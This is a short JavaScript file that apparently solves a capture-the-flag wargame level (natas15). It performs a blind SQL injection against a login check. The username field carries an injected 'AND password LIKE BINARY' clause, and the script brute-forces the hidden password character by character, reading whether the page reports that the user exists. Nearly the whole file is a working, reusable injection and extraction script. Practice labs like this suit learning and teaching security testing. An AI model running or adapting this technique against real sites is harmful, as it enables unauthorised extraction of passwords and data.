async function CheckPassReq(password, character){
    let data = []
    let senddata = {
        username: "natas16\" AND password LIKE BINARY \""+password+character+"%\" \"" //Need to remove the other percentage so that its a START WITH
    };
    let request
    try {
        const request = await $.ajax({
            url: "index.php?debug",
            method: "POST",
            contentType: "application/x-www-form-urlencoded",
            data: senddata
        });
        data = [password+character, request]    
        return data
    }catch(err){
        console.error(err);
    }  
}
/*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*/

/*##############################################################################################*/

function CheckResponse(responseText){
    let x = $(responseText).text()
    let r = /This user exists.*/im
    let y = x.match(r)
    if(y){
        return true
    }
}
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'.split('')

async function GetaCharacter(password){
    chars.forEach(async (character,index)=> {
		try {
				let response = await CheckPassReq(password, character)
				if (CheckResponse(response['1'])&& response[0].length < 33 ) {
					console.log(response['0'])
					password = response['0']
					console.log(password)
					GetaCharacter(password)
				}
				else{
					//console.log(password)
				}
						
	   
		} catch(error){console.error(error)}
	})
}    

let password = ''
GetaCharacter(password)
